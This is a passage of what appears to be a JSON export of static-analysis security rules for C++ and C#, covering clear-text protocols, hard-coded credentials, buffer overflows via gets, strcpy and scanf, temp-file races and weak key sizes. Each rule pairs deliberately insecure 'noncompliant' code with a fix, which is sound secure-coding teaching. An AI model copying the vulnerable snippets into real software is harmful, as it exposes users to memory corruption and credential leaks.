        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nchar* http_url = \"http://example.com\"; // Sensitive\nchar* ftp_url = \"ftp://anonymous@example.com\"; // Sensitive\nchar* telnet_url = \"telnet://anonymous@example.com\"; // Sensitive\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftp = curl_easy_init();\ncurl_easy_setopt(curl_ftp, CURLOPT_URL, \"ftp://example.com/\"); // Sensitive\n\nCURL *curl_smtp = curl_easy_init();\ncurl_easy_setopt(curl_smtp, CURLOPT_URL, \"smtp://example.com:587\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nchar* https_url = \"https://example.com\";\nchar* sftp_url = \"sftp://anonymous@example.com\";\nchar* ssh_url = \"ssh://anonymous@example.com\";\n</pre>\n<pre>\n#include &lt;curl/curl.h&gt;\n\nCURL *curl_ftps = curl_easy_init();\ncurl_easy_setopt(curl_ftps, CURLOPT_URL, \"ftp://example.com/\");\ncurl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS\n\nCURL *curl_smtp_tls = curl_easy_init();\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_URL, \"smtp://example.com:587\");\ncurl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = \"secret\"; // Sensitive\ndbi_conn_set_option(conn, \"password\", password.c_str());\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring password = getDatabasePassword(); // Compliant\ndbi_conn_set_option(conn, \"password\", password.c_str()); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cpp:S5798": {
        "name": "\"memset\" should not be used to delete sensitive data",
        "htmlDesc": "<p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.\nThis ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this\npurpose.</p>\n<h2>Why is this an issue?</h2>\n<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is\nabout to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these\nwrite operations.</p>\n<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler\nmay see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>\n<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>\n<h2>How to fix it</h2>\n<p>The function <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The\nmain difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear\nsecurity-sensitive data.</p>\n<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;string.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operation, such as <a\nhref=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN\">SecureZeroMemory</a> (Windows)\nor <a href=\"https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero\">explicit_bzero</a> (FreeBSD).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset(password, 0, strlen(password));  // Noncompliant\n  memset(localToken, 0, strlen(localToken));  // Noncompliant\n  free(password);\n}\n</pre>\n<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go\nout of scope.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string&gt;\n\nvoid f(char *password, size_t bufferSize) {\n  char localToken[256];\n  init(localToken, password);\n  memset_s(password, bufferSize, 0, strlen(password));\n  memset_s(localToken, sizeof(localToken), 0, strlen(localToken));\n  free(password);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> C++ reference - <a href=\"https://en.cppreference.com/w/c/string/byte/memset\"><code>memset</code>, <code>memset_s</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data\">Application Security\n  Verification Standard 4.0 - 8.3.6</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/14\">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cpp:S1079": {
        "name": "\"scanf()\" and \"fscanf()\" format strings should specify a field width for the \"%s\" string placeholder",
        "htmlDesc": "<p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow\ncan occur.</p>\n<h2>Why is this an issue?</h2>\n<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters\ninto the buffer until they encounter a whitespace character.</p>\n<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being\noverwritten. This situation is known as a buffer overflow vulnerability.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application\ndata, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the\nexecution flow of the application, leading to arbitrary code execution.</p>\n<h2>How to fix it</h2>\n<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be\nread into the buffer.</p>\n<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large\nenough to hold the required input and the null terminator.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nchar buffer[10];\nscanf(\"%s\", buffer);  // Noncompliant\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and\n<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nchar buffer[10];\nscanf(\"%9s\", buffer);\n</pre>\n<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;cstdio&gt;\n// ...\n\nvoid f() {\n  FILE * fp = fopen(\"/tmp/temporary_file\", \"r\"); // Sensitive\n}\n</pre>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n#include &lt;sstream&gt;\n// ...\n\nvoid f() {\n  std::stringstream ss;\n  ss &lt;&lt; getenv(\"TMPDIR\") &lt;&lt; \"/temporary_file\"; // Sensitive\n  FILE * fp = fopen(ss.str().c_str(), \"w\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n// ...\n\nvoid f() {\n  FILE * fp = tmpfile(); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S1081": {
        "name": "Insecure functions should not be used",
        "htmlDesc": "<p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not\nproperly check or limit the size of the data they are handling.</p>\n<h2>Why is this an issue?</h2>\n<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the\nprogram reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>\n<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as\na buffer overflow vulnerability.</p>\n<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid\nbuffer overflows.</p>\n<h3>What is the potential impact?</h3>\n<h4>Code execution</h4>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h2>How to fix it</h2>\n<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets_s(str, sizeof(str));\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy_s(buffer, sizeof buffer, input);\n</pre>\n<h3>How does this work?</h3>\n<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are\nknown to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use\n<code>gets_s</code>.</p>\n<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing\nwith strings).</p>\n<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;stdio.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a\nhref=\"https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya\">StringCbCopyA</a> (Windows) or <a\nhref=\"https://www.freebsd.org/cgi/man.cgi?query=strlcpy\">strlcpy</a> (FreeBSD).</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "csharpsquid:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    var RsaCsp = new RSACryptoServiceProvider(); // Noncompliant\n}\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    var DsaCsp = new DSACryptoServiceProvider(); // Noncompliant\n}\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    ECDsa ecdsa = ECDsa.Create(ECCurve.NamedCurves.brainpoolP160t1); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    var RsaCsp = new RSACryptoServiceProvider(2048);\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    var Dsa = new DSACng(2048);\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nusing System;\nusing System.Security.Cryptography;\n\npublic void encrypt()\n{\n    ECDsa ecdsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Pitfalls</h3>\n<h4>The KeySize Property is not a setter</h4>\n<p>The following code is invalid:</p>\n<pre>\n ----\n     var RsaCsp = new RSACryptoServiceProvider();\n     RsaCsp.KeySize = 2048;\n----\n</pre>\n<p>The KeySize property of CryptoServiceProviders cannot be updated because the setter simply does not exist. This means that this line will not\nperform any update on <code>KeySize</code>, and the compiler won’t raise an Exception when compiling it. This should not be considered a\nworkaround.<br> To change the key 